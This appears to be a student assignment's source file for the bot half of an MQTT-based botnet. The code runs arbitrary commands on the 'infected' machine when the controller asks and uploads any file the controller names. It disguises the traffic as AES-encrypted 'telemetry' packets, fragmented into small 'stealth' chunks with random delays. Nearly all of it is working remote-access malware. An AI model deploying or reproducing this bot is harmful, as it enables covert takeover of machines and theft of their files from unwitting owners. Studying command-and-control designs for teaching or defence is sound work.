# 5. Minimal required functionality of the bots:
#   1. announcing the presence of the bot to the controller if asked.
#   2. listing users currently logged in the "infected" device (output of 'w' command).
#   3. listing content of a specified directory (output of 'ls' command). The directory is a parameter specified in the controller's command.
#   4. id of the user running the bot (output of 'id command').
#   5. copying of a file from the "infected machine" to the controller (file path is a parameter specified by the controller).
#   6. executing a binary inside the "infected machine" specified by the controller (e.g. '/usr/bin/ps').
import base64
import json
import subprocess
import time
import threading

import paho.mqtt.client as mqtt
from consts import *
import random

from utils import encrypt_payload_AES_then_b64, decrypt_payload


# broker = central server that receives all messages
#          and then routes them to the correct destinations.

def heartbeat(client):
    # todo
    pass;


def send_fragmented_response(client, raw_result):
    """Breaks large results into 512-byte stealth packets"""
    #  leave room for prefix 'CHK:00:00:' (approx 12 chars)
    # 512 (target) - 4 (len prefix) - 12 (chunk metadata) = ~490
    #  use slightly smaller to be safe
    chunk_size = 480

    # Split the big string into pieces
    chunks = [raw_result[i:i + chunk_size] for i in range(0, len(raw_result), chunk_size)]
    total = len(chunks)

    for i, chunk_data in enumerate(chunks):
        # 3 digits for chunk indices to support very large files
        # Format:
        #       CHK:[current_index]:[total_count]:[data]
        fragment_text = f"CHK:{i+1:03d}:{total:03d}:{chunk_data}"

        encrypted_chunk = encrypt_payload_AES_then_b64(fragment_text)

        packet = {
            "s_id": BOT_ID,
            "type": "telemetry_update", # Masquerade type
            DATA_KEY: encrypted_chunk
        }
        client.publish(TOPIC, json.dumps(packet))

        # random delay
        time.sleep(random.uniform(0.1, 0.4))


def on_message(client, userdata, msg):
    try:
        # try parse json
        packet = json.loads(msg.payload.decode())
        # Check for secret ID
        if packet.get("s_id") == CONTROLLER_ID:
            encrypted_data = packet.get(DATA_KEY)
            payload_data = decrypt_payload(encrypted_data)
            parts = payload_data.split(" ", 1)
            action = parts[0]  # e.g., "ls"
            argument = parts[1] if len(parts) > 1 else ""

            # introduce random delay
            time.sleep(random.uniform(0.35, 1.69))

            print(f"[DEBUG]: Received command: {action} {argument}, executing...")
            result = get_action_result(action, argument)
            
            print(f"[*] Dispatching response ({len(result)} bytes) in chunks...")
            send_fragmented_response(client, result)

    except:
        # ignore other messages
        pass





def create_bot_packet(encrypted_res_b64):
    res_packet = {
        "s_id": BOT_ID,
        "type": "telemetry_ack",
        DATA_KEY: encrypted_res_b64
    }
    return res_packet


def get_action_result(action, argument):
    if action == CMD_ANNOUNCE_BOT:
        result = f"Bot {BOT_ID} is online."
    elif action == CMD_COPY_FROM_BOT_TO_CONTROLLER:
        with open(argument, "rb") as f:
            encoded_str = base64.b64encode(f.read()).decode('utf-8')
            result = f"FILE_B64:{argument}:{encoded_str}"
    else:
        # execute other commands directly
        # ignore blank "" args
        cmd_list = [action] + ([argument] if argument else [])
        result = subprocess.check_output(cmd_list, stderr=subprocess.STDOUT).decode()
    if result == "":
        result = f"Command {action} executed successfully."
    return result


# both the bot and the controller are 'clients'
# client = mqtt.Client()
# added version to avoid warning
client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)

# callback when a message is received
client.on_message = on_message
client.connect(BROKER, PORT)
client.subscribe(TOPIC)

print("Subscribed! Waiting for commands...")

# prevents the script from ending.
client.loop_forever()
